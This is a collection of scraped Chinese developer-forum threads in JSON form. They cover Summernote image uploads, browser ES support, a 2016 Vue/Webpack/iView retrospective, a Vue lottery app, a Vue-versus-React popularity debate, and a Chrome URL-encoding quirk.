{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>1.$('#summernote').code()这个方法可以取到值 为什么我看 api 上是$('#summernote').summernote （'code'）；\n后面一种返回的是[object,object];\n2.编辑器里面有图片的话好像默认保存的是 base64 编码，保存数据库显示过大，有什么其他方法吗，网上搜了好像是什么 onimageupload 啥的不是很懂</p>\n</div></div>"], "reply": "5", "tittle": "关于 summernote 的几个问题", "comment": ["1 第一个好像是没清缓存 现在可以了", "第二个 需要再服务端写一个接收程序 然后修改下 summernote 的调用参数\r", "onImageUpload: function (files, editor, $editable) {\r", "                                UploadFiles(files, insertImg);\r", "                            }\r", "\r", "其中的 uploadfiles 是你自己通过 ajax 提交文件就可以了。\r", "insertImg 是 callback", "  可以了 不过这种删除有回调吗 没得话 岂不是会有垃圾文件？", " 自己写后台，怎么存还不是自己说了算。。", "  我没说存啊。。我说删除。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我关心的浏览器有 chrome Safari 和 Firefox ，这三款即可</p>\n<p>请大神赐教</p>\n</div></div>"], "reply": "7", "tittle": "各大浏览器最新版都支持到 ES 第几版？", "comment": ["caniuse +1", "caniuse +2", "只能说支持到 ES5 ， ES6 再往后都是不断在跟进\r", "\r", "目前一般都是 ES6 开发，转 ES5 去执行的", "es5 肯定 是支持了， es6 也支持超过 80%以上"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><blockquote>\n<p>2016 年工作中做过最自豪的两件事情：</p>\n</blockquote>\n<ul>\n<li>把 Vue.js 和 Webpack 技术栈引进公司并逐步成为前端规范；</li>\n<li>开源 <a href=\"https://github.com/iview/iview\" rel=\"nofollow\">iView</a> 项目。</li>\n</ul>\n<h1>初识 Vue</h1>\n<h2>第一次接触</h2>\n<p>使用 Vue.js 已经有一年半时间了，在接触 Vue 之前，有写过半年多的 Angular ，所以刚了解 Vue 时，与很多开发者一样，认为 Vue 是一个轻量级的或是移动端的 ng ，就好比 zepto 之于 jQuery 。直到 15 年 10 月，打算用 Vue 开发一个个人项目时，才开始认真地学习它，发现 Vue 的使用方法和 API 设计如此优美简洁，而且中文文档甚是详细，我觉得这也是 Vue 受很多中国开发者喜爱的原因，许多初中级开发者、英文不好的、 jQ 导向的，在刚接触 MVVM 时，这点很有价值，再者 Vue 的使用和学习门槛相比 ng 和 React 的要求都要低，概念理解起来也容易。</p>\n<p>比起 Angular ， Vue 最大的特点就是对数据双向绑定这件事处理的很优雅。 ng 中你需要注入依赖服务，比如 $scope 和 $rootScope ，变量写起来也散落在各处，而且有时候还得用 $apply 来告知，这对于很多初学者来说是很麻烦的事情。我以前是写 jQuery 的，所以还是喜欢用 jQ 的很多东西，比如 ajax ，而 Vue 在数据使用上很灵活，可以引用外部变量，可以在各种情况下直接修改，不需要额外的工作，所以当看到 Vue 双向绑定这一特性时，就决定尝试用它了。</p>\n<h2>一个人搞了一个产品</h2>\n<p>从 14 年毕业到 15 年底，就一直在两个规模不大的创业团队工作，先后做了 5 款产品，都是 App ，涉及的面也很广，比如 Canvas 、 Hybrid 什么的。在初创团队工作就像打了鸡血一样，每天早上起床都迫不及待地开始写代码，对工作的热爱绝对不是只把它当做一件赚钱的事情，所有人都是有理想和技术追求的，所以那段时间我做的东西都很用心、精致。</p>\n<p>两年的创业经历也把我锻炼成了一个对产品有理解、追求细节、美观的一个人。</p>\n<p>从 15 年中旬开始，由于项目需要，我开始接触 Python ，这也是我第一次接触后端语言，以前对服务端的开发是一点不懂的。不知道是 Python 本身的原因，还是我理解的快，上手其实并不难，而且没多久就已经可以熟练的写起来了（现在接触的东西多了，觉得那时学习的快，是有一套很好的架构和有人带，先能写，然后慢慢了解其中奥妙，这种办法对于程序员掌握一门新技术还是很有效的）。</p>\n<p>我相信但凡写过 Python 的人，都会用优雅来形容它，比如一行代码带有循环的赋值：</p>\n<pre><code>user_hash = dict((str(user.id), user.to_base_dict()) for user in users)\n</code></pre>\n<p>其实写后端和写前端，很多地方是想通的，只是概念上有区别。只不过后端专注在数据的获取、缓存和整理上，加以各种服务，前端则在获取数据、整理数据、可视化数据。</p>\n<p>学会了 Python ，发现这个时候可以自己独立做一点东西了，于是就有了 <strong>一个人搞了一个产品</strong> 。不卖关子了，这个产品就是 <a href=\"https://www.talkingcoder.com/\" rel=\"nofollow\">TalkingCoder</a>，从产品、设计、前端、后端、运维、 iOS &amp; Android 客户端，几乎都是我一人撸的了，只不过在写移动 App 时，有两位兄弟帮忙写了个壳。</p>\n<p>从产品和技术复杂度上， TalkingCoder 很接近 知乎 和 Segmentfault ，基于关注内容推荐的 Feed 流、文章、提问（最佳实践）。看一下用到的技术栈：</p>\n<p><img alt=\"\" src=\"https://dn-mhke0kuv.qbox.me/475dcfbc7206f8623496.png\"></p>\n<p>后端当然是基于 Python 了，主要用 <strong>Tornado</strong> 框架提供 Framework 和 WebService 及 APIService （也巧，貌似 知乎 和 Segmentfault 也用的 Tornado ）。 Tornado 是一个单线程、单进程、非阻塞式的 Web 框架，性能很不错。<strong>Sqlalchemy</strong> 提供 ORM （ Model 层），这东西很好，尤其是对于我这样不太擅长写 sql 的人。<strong>Celery</strong> 提供了 worker ，完成一些不影响用户使用的定时任务（统计）、耗时任务（发邮件）等，通过异步，不阻塞主线程。<strong>Redis</strong> 主要用于存储用户的 token ，数据库用的是 MySQL （阿里云 RDS ），同时还用了下阿里云的 SLB 负载均衡（其实没有什么好均衡的，量又到不了知乎那级别，主要还是做 https 的支持和域名绑定，对 Nginx 不是很熟， 17 年要学一下了，毕竟 SLB 的费用一年也好几百呢😝）。</p>\n<p>前端相对还是比较传统，没有完全使用 前后端分离 ， Vue 也没有用到组件和组件化，主要原因还是刚学 Vue ，没有深入到组件，所以路由和页面渲染，甚至 html 模块都是 Tornado 完成的。任何技术都需要循序渐进，如果现在再写一遍，肯定不是这套架构，但在当时，这的确是最好的技术方案。但是服务端渲染也是有好处的，比如 SEO 、页面打开速度，前端再怎么优化，也没有直接服务端渲染好 HTML 来得快。</p>\n<p>iOS 和 Android App 是在 web 版全部完成后开发的，当时找了两个对技术有追求的 iOS 和 Android 的小伙伴帮忙搭了壳，定制了一些 UI 和 Bridge 接口， iOS 用的 UIwebview ，本打算用 WKwebview ，但测试下来很多地方效果不是很理想，最终还是选择了较为成熟的 UIwebview 。整个移动端开发过程大概 2 个多月吧，也是基于 Vue + Gulp + Swiper 的，体验还算不错，尤其在 iOS 上。</p>\n<p>运维是我的短板， Linux 不怎么熟，所以很尴尬的就是一开始只能在自己电脑上玩，到了 ECS 上就蒙了。好在 TalkingData 大牛有的是，折腾了一周，所有的环境和库都装好了，找人帮忙写了个 shell ，就这样上线了，上线后，就再没断过。</p>\n<p>前前后后开发了有近半年，服务上线也快一年了，这套架构从没出现过故障和报警，唯独一次重启机器把 Redis 数据丢失了。这个项目让我对 全栈 有了更深的理解，但凡是后端的会点 Angular ，前端的会写写 Node.js ，都不完全是全栈，全栈应该是能理解整个产品的命脉，并把它最终实现出来，安全运行。</p>\n<h2>推广 Vue</h2>\n<p>我是 15 年双十一那天加入 <strong>TalkingData</strong> 的。 TalkingData 仍然还是创业公司，但规模和影响力要比我之前的两家大很多，在大数据领域，更是领先者。</p>\n<p>在这里，前端团队都统称为可视化，因为我们是跟数据打交道。其实 TD 几年前是没有专门的前端团队的，由于历史问题，很多产品线都还是较老的技术，公司的核心技术在大数据处理能力上，前端页面很多都是写 Java 的同事做的，用的最多的自然是 Angular （知道 ng 背景的肯定了解其中的原因😝）。</p>\n<p>我刚来时，做的是一个基于百度地图 overlay 的大数据地理可视化框架 TDMap （各种原因尚未开源），贴几张图感受下吧：</p>\n<p><img alt=\"\" src=\"https://dn-mhke0kuv.qbox.me/5cb446730b4abfe8db4a.jpg\">\n之后就是我的第一个业务类项目了，也是全面运用 TDMap 。当时用的是 TD 自研的一套组件引擎和 jQuery 。这个项目到最后做权限系统时，才开始接入 Vue.js ，这应该是 TD 首次使用 Vue ，不过当时也有限制，只用它做简单的双向绑定，但仅此一点，开发效率已经提高很多了。</p>\n<p>在一个公司推广一项技术栈也是有难度和技巧的，因为不同的人思考问题的角度可能会不同。新的东西一方面会增加学习成本，一方面对它潜在的问题是未知的，如果暴露出了问题或性能瓶颈，是否能够处理或应急方案，尤其是选择开源框架时，社区影响力、维护和持续开发都是考虑的因素。好在 Vue.js 给我们带来了很多惊喜，社区反响也不错，一句话就是用着放心。</p>\n<p>既然尝到了 Vue.js 带来的甜头，就要把它推广起来，提高整个前端团队的开发效率。</p>\n<h1>Webpack ，又一前端神器</h1>\n<p>如果只是用 Vue.js 的基本功能，那其实只利用了 20%的特性。\n推广 webpack 这一过程是缓慢的，因为开始和很多人一样，以为又是个和 Gulp 类似的工具，所以有段时间仍然是使用 Vue + Gulp + jQuery 的技术栈，已经开始使用 Vue 的组件，但还没有组件化。这样写的多了，问题就暴露了：</p>\n<ul>\n<li>每个组件需要手动拆分 html 、 js 、 css 部分，维护成本高；</li>\n<li>html 需预先加载，所以会看到一个页面有一大坨的 html</li>\n</ul>\n<p>业务第一，一开始也就没有在意工作流，虽然麻烦，但也撑了几个小项目。直到一个机会开始做 <a href=\"https://www.talkingdata.com/product-MarketingCloud.jsp?languagetype=zh_cn\" rel=\"nofollow\">MarketingCloud 营销云</a>，才开始彻底学习 webpack ，好在项目初期不太紧张，有了一周多过渡时间来搭建。</p>\n<p>我觉得 webpack 的难点在于概念，因为你在开发时写的代码，并不是最终呈现的代码。这对于传统技术栈来说思维切换还是需要成本的，因此有了一个概念：编译。\n说到底， webpack 就是一个 .js 配置文件，你的架构或好或差，都体现在这一个配置里，随着需求的不断出现，工程也是逐渐完善的，一口吃不成胖子。这里也分享一下 TalkingData 用到的工程配置：\n<a href=\"https://github.com/icarusion/vue-vueRouter-webpack\" rel=\"nofollow\">https://github.com/icarusion/vue-vueRouter-webpack</a>\n关于 webpack 的技术介绍就不多扯了，掘金上有很多不错的文章，不过也推荐我之前写的几篇：</p>\n<ul>\n<li><a href=\"https://www.talkingcoder.com/article/6310080842228107877\" rel=\"nofollow\">Vue+Webpack 开发可复用的单页面富应用教程（配置篇）</a></li>\n<li><a href=\"https://www.talkingcoder.com/article/6310724958473489215\" rel=\"nofollow\">Vue+Webpack 开发可复用的单页面富应用教程（组件篇）</a></li>\n<li><a href=\"https://www.talkingcoder.com/article/6310756346094488391\" rel=\"nofollow\">Vue+Webpack 开发可复用的单页面富应用教程（技巧篇）</a></li>\n</ul>\n<p>这一年下来，这套架构在多个项目中得到了验证，工作效率自然是提升了不少，也奠定了我们前端团队的开发规范， Vue 的推广，至此算是非常成功了。</p>\n<h1>iView ，把开发效率再提高 50%</h1>\n<p>经常混掘金的小伙伴，应该对 iView 不陌生吧！再贴一下地址：\n<strong><a href=\"https://github.com/iview/iview\" rel=\"nofollow\">https://github.com/iview/iview</a></strong>\n也感谢大家的关注与支持， iView 的 1.0 工作马上就结束了，计划的 43 个组件，现在已经完成 41 个了，我们也承诺过，在 1.0 发布后，会在 17 年初支持到 Vue2.x 。\n关于 iView 的介绍和使用，这里就不多说了，可以看看下面三篇文章，这里主要还是想说说关于它的一些故事和开源的经历。</p>\n<ul>\n<li><a href=\"https://gold.xitu.io/post/581ee7de128fe1005a06dd34\" rel=\"nofollow\">Vue 高效 UI 组件库— iView 开发实践</a></li>\n<li><a href=\"https://gold.xitu.io/post/5843dcad128fe100577876e1\" rel=\"nofollow\">Vue 中你不知道但却很实用的黑科技</a></li>\n<li><a href=\"https://gold.xitu.io/post/5859c5fab123db0065926723\" rel=\"nofollow\">项目进展快，全靠 iView 带 | 掘金技术征文</a></li>\n</ul>\n<p>发起这个项目的初衷，是公司举办的一次创新项目活动，当时团队正好也需要一套自己的 UI 组件库，于是就申请了，从此就信心满满地开始了来源之旅，那时是 16 年 7 月。</p>\n<p>时间过得真是快，都开发 半年 了，也收获了近 3000 ★。因为是第一次做开源项目，对 Github 、 npm 的很多东西还不了解，虽然平时都在用，但却没发布过。慢慢地知道了什么是 <code>.gitattributes</code>、<code>.npmignore</code>、<code>.travis.yml</code>、<code>.eslintrc.json</code>，也了解了 MIT 、 Apache Licence 2.0 开源协议，涨了不少姿势。</p>\n<p>iView 在一开始时，还是暴露了很多问题，比如必须通过 webpack 才可以使用，而且还得配置 babel ，否则无法编译 <code>node_modules/iview</code> 下的文件，就这一个简单的配置，折腾了很久，因为不同平台不同版本，写法不一样。后来在 <a href=\"https://github.com/jingsam\" rel=\"nofollow\">@jingsam</a> 的 contribution 下，优化了 iView 编译过程，最终不再依赖 webpack ，也不需要配置 babel ，在此特别感谢下 jingsam ，虽从未见面，却对技术有着同样的追求。</p>\n<p>iView 基本是我一个人在开发和维护，不过有一位在美国上大学的同学也多次贡献代码，我们的沟通似乎并没有时差的概念，因为他基本很晚才睡，夜猫子类型的 <a href=\"https://github.com/rijn\" rel=\"nofollow\">@rijn</a>，在此也特别感谢。</p>\n<p>iView 的 contributors 并不多，也借此机会，希望更多对技术有追求的朋友能参与到 iView 2.0 的开发中，把它一起做好。</p>\n<p>因为太想把 iView 做好，所以在写每个组件前，都看了很多别人的实现，比如 Element UI 、 vue-antd 、 AntDesign 、 vue-beauty 等，这个过程学到了很多东西，看别人代码的确是最快最有效的学习方法，因为有时候思路会被限制，看看别人的实现，才能打开思路，多加对比，也能知道几者之间的差距。</p>\n<p>现在公司最核心的服务 — 应用统计分析已经开始用 iView 重构了，相信在 2017 年， iView 也会像 Vue 和 Webpack 一样，被很多项目验证。</p>\n<h1>后记</h1>\n<p>16 年可以说是工作以来进步最大的一年了，学习了很多前沿的技术，也做了不少东西，但做技术的就是这样，接触的越多，越能感到自己的渺小， 17 年继续加油吧！</p>\n<p><strong>作者：梁灏</strong>\n<strong>文章首发于掘金，未经许可，禁止转载</strong></p>\n</div></div>"], "reply": "37", "tittle": "2016 我的心路历程：从 Vue 到 Webpack 到 iView", "comment": ["支持以下。", "真厉害啊，支持。", "像撸主学习 \r", "不过我还是主后端 前端比较感兴趣那种", "支持", "厉害", " 另提个小问题，楼主这两个链接需要换一下了，域名过期。", "不错 向作者学习", "我还是对楼主一个人写全栈比较感兴趣", "支持", " 好的，谢谢", "一不小心从 cnode ，掘金， V2EX ，知乎上的 timeline 上看到楼主了。。。。。", "为嘛不用 dict comprehension?\r", "user_hash = {str(user.id): user.to_base_dict() for user in users}", "滋瓷", "兹词一下，在下的部门也在用 Vue + Webpack ，里面也踩了不少坑，比如多项目公用 npm 模块访问 Vuex 的问题， Vue-Router 的动态配置问题，单文件写 TS + 编辑器感知问题，组件循环初始化首屏性能问题等，不过最后基本都解决，总体来讲 Vue 是个很好的框架.\r", "\r", "16 年我们将打包构建从 gulp 转为 Webpack ，新项目使用 Vue 编写，引入了内部 npm 与新的发布系统，建立了文档维基（魔改了下 Docsify ，加入了密码访问与简陋的全文搜索），今年争取在集成与测试上面加把力，另外希望再推广一下 Typescript.", " haha ，到时候也可以分享分享经验", "nice 一个人能快速撸一条线确实有爽爆的感觉", "k", "有个疑问：为什么其他的标签都是首字母大写的形式，如 Radio 、 Tag 等，而 table 却是 i-table?", " 组件不能使用原生的标签，比如 select 、 option 也是不行的", " 原来如此，但是觉得不统一的话还是有点怪怪的。\r", "比如 Element UI ，都是统一“ el-”前缀。", "厉害了~\r", "之前在知乎上发过？", " 没有，掘金首发，然后才知乎", " ", "\r", "之前看过这个帖子，有点印象~", "厉厉厉厉厉害", "厉害", "好厉害", "比较好奇 “最终不再依赖 webpack ，也不需要配置 babel ” 是怎么做到的...可以给个思考方向吗", " iView 代码里都有，可以研究研究。最终编译为 iview.js 和 iview.min.js", "有看源代码，不错的！", "赞个", "屌。。。学习了", "66666666666666666", "榜样", "支持一下", "技术路径好类似", "在知乎也看到你们的广告了。", "好厉害啊，希望自己也可以一直保持对技术的追求！"]},
{"content": ["<div class=\"topic_content\">先上地址： <a target=\"_blank\" href=\"https://github.com/ousui/lucky-draw\" rel=\"nofollow\">https://github.com/ousui/lucky-draw</a>\r<br>\r<br>朋友那边同学聚会搞抽奖，要求如下：\r<br>1 、 50 人左右\r<br>2 、四个奖项，每个奖项多少人中奖\r<br>\r<br>需求太简单，没有特意写随机算法，就是随机取编号内的某个值开始循环，直到停了为止，时间为 1ms ，应对 100 人以内基本没大问题。\r<br>\r<br>几年前自己做前端的时候还是 Ext, jQuery ，哪有 vue 这些概念。\r<br>年前闲着拿起来 vue 看了看，做了做，感觉还是不错的，前端发展真是越来越好了。</div>"], "reply": "目前尚无回", "tittle": "好久没玩前端了，最近受朋友之托撸了个抽奖的程序，用的 vue", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>应该算是情理之中</p>\n<p><a href=\"https://risingstars2016.js.org/\" rel=\"nofollow\">https://risingstars2016.js.org/</a></p>\n</div></div>", "<div class=\"topic_content\">成熟点，不要动不动就争论</div>"], "reply": "91", "tittle": "2016 JavaScript Rising Stars 「讲道理 Vue 已经超过了 React 了」", "comment": ["现在的前端像几年前 java 各种框架的混战。来一个世界级标准让程序员少受点累", "从生态环境上来看 Vue 同 React 差的还是有点远", "道理我都懂，可我还是选择 React", "讲道理：是 2016 年新增的星星超过了，总数还有差距", "总数上 angular 还最高呢，看看趋势才是 ", "说的好，我选择 React", "哪个简单用哪个, 我才不想加班呢", "大公司里面还是 react 比较多， vue 更多是个人项目或者创业团队在用", "不用 elm 都是歪门邪道", "轮子再好，不如骑兵", "vue 就是人民群众喜欢的东西，接地气。 react 好是好，但是没 vue 接地气。\r", "\r", "小白要从 vue 和 react 中挑一个，估计挑 vue 的占多数，所以 vue 的逐渐火爆是必然的。", "优越感？", " \r", "\r", "elm 总觉得是半残疾的，还是我大 purescript 靠谱", "React 性能优化靠大家 vue 性能优化靠尤大 真正能让你感受到强大的是 React ，踩坑也是必不可少的。。", "一开始，也没人觉得 jQuery 会赢", "都是工具，区别在于手感，效率取决于使用者。 jQuery 才是最好的", "说的好，我选择 React", " 那你还用框架干啥？手撸 mvvm 最能感受到强大了好吧。", "在中国推广的好啊", "有点像早前的 jQuery, prototype, mootools 还有 YUI 之间的竞争一样。", "全家桶太蛋疼，尤其是 redux", "我们用的 vue ，确实比较容易上手", "我有种不负责任的感觉哈， Vue 的 star 有一定的跟风成分，而且 Vue 生态的成熟程度距离 React 还有相当的距离吧", "因为很多人在 2015 年就把 React star 了吧→_→", "我爱 JQuery", "Vue.JS is used in production by big companies (including Alibaba, the biggest e-commerce company in China), so you can consider it as a safe choice.\r", "\r", "哈哈，看到这个笑了， ali 啥没用过啊", " 阿里内部还要分各个技术派系呢", " Vue 的 start 几乎都是国人，跟风程度很大，而且 stare 其实就是相当于朋友圈点赞，由于 vue 的开发者会刷知乎啥的所以朋友圈人多罢了，重要的是生态环境。\r", "\r", "我一般比较的维度：\r", "谷歌趋势 ", "\r", "StackShare\r", "stackoverflow 和 Quora\r", "Udemy 教程或者 Youtube 视频数量。", "React 跟风的才多吧， Vue 背后又没有大公司", "Vue 生态也不差啊，该有的都有吧...", "Angular......", "如果是码农，想必会经常用 stackoverflow 搜索问题，不知道那些用 vue 的是谁在上面帮你解答疑惑？或许 vue 比 react 用户更喜欢通过 qq 群找问题答案吧\r", " ", "   ", " ", "想起一句经典的电影台词：\r", "\r", "live or die, make your choice", "笑了，你去看看各大公司招聘 jd ，各大招聘网站搜索关键字看看， react 比 vue 远远大的多，社区不是 vue 能比的，高端玩家比例也比 vue 多，虽然我用 vue ，但是还是要实事求是", "vue 就国人多而已吧，反正我觉得老外这边基本上都是走 react 和 ag 去了", " 强迫症看你写个 star ，感觉要炸了", "之前用 react+redux 做了个项目，感觉这套东西对一般项目有点过度架构了，现在正在试转 vue 中", " \r", "因为 vue 是国人写的嘛?", "2017 的新年愿望是前端别再讨论框架了", "vue 帮助了太多英语差的弱鸡前端", "仔细想想， react 才是跟风的吧", "要用 vue 你几乎不可能在伦敦找到工作。\r", "框架是个好框架，只是就事论事", "## 2017 的新年愿望是各位大神别在自成一套。一人写一套 UI 组件库了。。了了了！\r", ">太可怕了。。国人为了刷经验，看了别人的框架就自成一套写一个组件库。等你一用就不维护了。可怕。。。", " > vue 性能优化靠尤大\r", "\r", "是因为你不认识社区里其他人。。", " 这 UI 库确实有点多 😂 可是用不用是你的事没逼你用啊", "楼主这标题也说的很含糊:\r", "\r", "> 讲道理 Vue 已经超过了 React 了\r", "\r", "只是今年的 star 更多而已，什么就超过了 😂", " 我觉得理想的社区是，有人发起项目。然后有意向的一起参与维护。。\r", "> 不要用那种 \"他写的好垃圾。还是自己来写个吧\"。。:(", " 其实 React 的 UI 库更多 🤔", " vue vuex 给我感觉性能优化都默认开箱即用 相比之下 React&Redux 需要手动 immutable", "谁分析下 vue 的 github 关注用户都是哪个国家最多？", "找工作还是 react 和 angular 吧", "堪比娱乐圈", " 不用 redux 就好了……把 react 当一个 view 来用", "还在用 jQuery 的是不是已经被时代抛弃了？", "我爱 jQuery", "又要发布新版本了么，还是怎么的，又出来公关。 vue 本身是不错的，就是国内的这些 尤大吹， vue 吹，真是恶心，堪称前端圈的 tfboy 脑残粉。", " 这网址不错 ", "还在用 angular1 :)", "个人还是选择倾向 React", "说的太好了，我用 react", " jQuery 是真牛逼，你看看现在的浏览器就原生支持 jQuery 那个堪称神来之笔的 css selector(document.querySelector)，平台将库的功能收作正规军。\r", "牛逼的东西都是在无形中的时候改变着世界，它将成为标准，而不仅仅是一时的风潮。", "只有 ng2 才有望成为前端中的 spring ，其他的太小家子气。", "反正所有的前端轮子都是在给 js 续命", " npm 一直给续着。如果哪天 js 没了，估计一定是个有强大生态支持的某语言替天行道，不过会么？", " 我看 commit 分布全是尤提交的，你说的是社区里的哪些人？", "楼主说得好， vue 牛逼，但我还是用 react\r", "不是一个数量级的，没什么可比较。\r", "这就如之前的一个段子：\r", "王思聪他爹给他 5 个亿，他挣了 40 个亿，翻了 8 倍！我爹给我 5 块钱，我买了一副手套和一瓶水，到工地搬砖挣了 200 ，翻了 40 倍！事实证明我比王思聪要厉害的多！", "\r", "\r", "react 社区某种程度上存在问题，官方对于 react 是有偏好的，比如兼容性，比如 ES6 ，比如类型，实际上 react 维护是会顾及 Facebook 自身使用场景的，如果说阿里想要一个适合自己的版本，最简单就是自己重建一个。而 vuejs 是全职的作者加上他的团队，显然可以更好地照顾社区的声音，大概也是重要的原因之一， vue 不像 react 社区那么碎片化。\r", "\r", "那么 vue 是否超越了 react ？看下具体的功能，各种组件， UI 库，都已经相当丰富。往外扩展的功能呢，比如服务端渲染，比如 native 渲染。 reactjs 的服务端渲染早就实现了，但是性能优化方案，好像是 16 年的 react 大会提出的，有 PR 但是没合并，最后似乎在 preact 之类社区框架有实现。 vuejs 去年夏天整个实现了，其实还不错。 native 渲染大家看到了 weex ，还在完善当中。\r", "\r", "说快赶上 react 我觉得也还可以。不过 immutable 这个事情，我个人认为 immutable data 是未来的方向， react 算是拥抱了 immutable ，虽然效果比 clojurescript 还是差好多。 vuejs 大概是反感 immutable ，宁愿用黑科技手动优化。我个人认为考虑将来的发展， vue 有比 react 更长的路需要走。\r", "\r", "而且 react 原作者 Jordan Walke 前段时间忙着玩 Reason ，用 HM 类型玩 React ，可以去 Twitter 感受一下……不知道尤小右会不会哪天也造个语言出来。", "vue 我认为国人的 star 至少占 70%，而且跟风和人云亦云非常严重，大量小白因为看不懂英文而放弃 react 的不在少数。而且 vue 感觉和 ng 太像了，学过一些 ng ，很容易可以上手使用 vue 。那既然如此我为啥不用 ng 呢，还有稳定的社区支持。 vue 的低端用户相当多，不如其他框架分布那么均匀。\r", "\r", "选择上，我觉得还是 react+flux 体系更为放心，社区支持很好，低端小白少，能和你讨论的，基本上是对 react 有一定了解的人，这无形中过滤了一群我不太愿意去接触的人。", "来个不同的关注点， Electron 大法好：）", " 这年头连用个 stackoverflow 都能用出优越感， github issue 没用？ gitter 没用？", " github issue 数量？", "你如果真感兴趣可以去查，难不成你得出 vue issue 少说明 bug 少的结论？不要搞笑好不好，一方面 vue 确实用的人不多，另一方面很多 vue 用户连 github 都不怎么上的，这是事实，不是优越感", "引用上面 v 友的回复:", "vue 我认为国人的 star 至少占 70%，而且跟风和人云亦云非常严重，大量小白因为看不懂英文而放弃 react 的不在少数。而且 vue 感觉和 ng 太像了，学过一些 ng ，很容易可以上手使用 vue 。那既然如此我为啥不用 ng 呢，还有稳定的社区支持。 vue 的低端用户相当多，不如其他框架分布那么均匀。\r\r选择上，我觉得还是 react+flux 体系更为放心，社区支持很好，低端小白少，能和你讨论的，基本上是对 react 有一定了解的人，这无形中过滤了一群我不太愿意去接触的人。", " vue 是讨论组用的比较多", " 没人说 issue 数量，我强调的是，并非 stackoverflow 是唯一的解决问题的途径，也并不是除了 stackoverflow 就是 [qq 群找问题]  没你说的那么不堪。\r", "\r", "想起了之前某人的一句话，因为 XX 易上手，所以全是低端用户，嗯，这逻辑我服。", " 估计他就没用过 gitter ，会两句英文在 stackoverflow 上面提问题了，瞬间感觉自己高大上了", " node 社区果然是低端用户多", "人生苦短,我用 vue,能快速出活才是硬道理", "大半年前写个页面，涉及到十几个状态切换逻辑。当时 React 和 Vue 一起学一起试：\r", "React 学了 3 天，连带着 redux 也用好了，做出来了，报错很好，调试方便，还有专用的调试插件（虽然我没装）。\r", "React 文档看得云里雾里的时候用了 Vue ，看着文档简单只学了 1 天，就是死活写不出来，明明都已经按文档做了，既不报错，有没有正确显示，想调试都不行，只能爬源码了……\r", "后来才知道 vue 是国人写的，我也就原谅它了，但是我也不会再考虑用了。\r", "\r", "Vue 确实是出活快， 1 天就能上手，但是，长期来看呢？项目复杂度上来后呢？\r", "核心简单的东西哪怕外表丑陋一些都不要紧，比反过来的那种更值得信赖。按这个逻辑，我也不喜欢 Angular 。", " ", "Gitter 不就是看上去不那么 Low 的 qq 群吗，还用出高贵感了。。", " 也许是 WebAssembly", " 好了 好了 这智商我也就不争论了 下面的继续", " vue 本身是不错的，就是国内的这些 尤大吹， vue 吹，真是恶心，堪称前端圈的 tfboy 脑残粉。", "讲道理 这个口头禅 真的有点恶心了 个人意见", "万事皆怕跟风，说出自己的理由先", " \r", "骑兵不如步兵~~", " 喜欢不经脑子提问 而不是通过搜索", "看到新闻\r", "\r", "有点奇怪啊... VUE 虽然是国人写的，但刚开始一堆人是吐槽没中文，先从国外开始推的，最初都以为是外国写的。后来才慢慢翻出中文文档的。\r", "以前是个人作品，推广没那么下力，现在好像已经有团队开始推广翻译了。", "有没有像我这种从来不 star 的。。。", " > 我看 commit 分布全是尤提交的\r", "\r", "当看到这个我就什么都不想说了，你有兴趣可以再看一遍。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近遇到了一个头大的编码问题，出现在 Chrome 改变页面编码至非 UTF8 的时候。</p>\n<p>当前的 Chrome 已经不支持随便改页面编码了，所以要么安装插件，要么需要在本地调试，把编码设定到非 UTF8 ，比如 GB18030 。</p>\n<pre><code>var foo=new Image();\nfoo.src = 'https://mdn.mozillademos.org/files/7693/catfront.png 你';\nconsole.log(foo.src);\n</code></pre>\n<p>以上这段返回的结果是<code><a href=\"https://mdn.mozillademos.org/files/7693/catfront.png%20%E4%BD%A0\" rel=\"nofollow\">https://mdn.mozillademos.org/files/7693/catfront.png%20%E4%BD%A0</a></code>。</p>\n<p>…嗯，非常正常。</p>\n<pre><code>var foo=new Image();\nfoo.src = 'https://mdn.mozillademos.org/files/7693/catfront.png?你';\nconsole.log(foo.src);\n</code></pre>\n<p>…返回的结果是<code><a href=\"https://mdn.mozillademos.org/files/7693/catfront.png?%C4%E3\" rel=\"nofollow\">https://mdn.mozillademos.org/files/7693/catfront.png?%C4%E3</a></code>。</p>\n<p>…只多了一个问号，编码和之前完全不同了，变成了 GB18030 编码…</p>\n<p>所以这是什么状况… Chrome 的 Bug 还是有标准要求这样处理？</p>\n<p>有些不能理解，顺便 IE 是不会对这个字符串做 escape 的，实际提交了怎样的请求还有待观察…</p>\n</div></div>"], "reply": "6", "tittle": "诡异的 Chrome 编码问题…？是我见识短吗…", "comment": ["Edge 对不问号的反应是`https://mdn.mozillademos.org///files/7693/catfront.png?ä½ \r", "\r", "\r", "对带问号的反应是`https://mdn.mozillademos.org///files/7693/catfront.png?ä½ `\r", "\r", "有些莫名其妙了…其中“ä½ ”用 escape()转码后刚好是%E4%BD%A0 …", "被 V2EX 的自动处理坑了一波， Edge 对不带问号的反应是`%20ä½%C2%A0`…%C2 出现的莫名其妙。", "1 ，网站如果使用 UTF8 的话，第二段代码也会使用 UTF-8 。\r", "2 ，网站如果使用 GBK 的话， url 部分依然是 UTF-8 （？？？）， query 部分会被编码为 GBK 。\r", "3 ， chrome/firefox 表现一致。\r", "\r", "问号部分和我预期不符啊。。。等高人解释问号部分。。。", "把编码设定到非 UTF8\r", "是指 HTML 文件包含 `<meta name=\"Content-Type\" content=\"text/html;charset=gbk\">`还是说文件的实际存储代码是 gbk ？", " 二者均有。事实上单纯在浏览器中改变编码并使用控制台测试也可以触发这个问题。", "简单翻了一下 URI 的 RFC ，似乎没有提到“ query 的编码由当前页面决定， path 统一编码为 UTF-8 ”这样的描述。\r", "不过也许是我看的不仔细，或者这件事是由 w3c 一类的规定的…？"]},
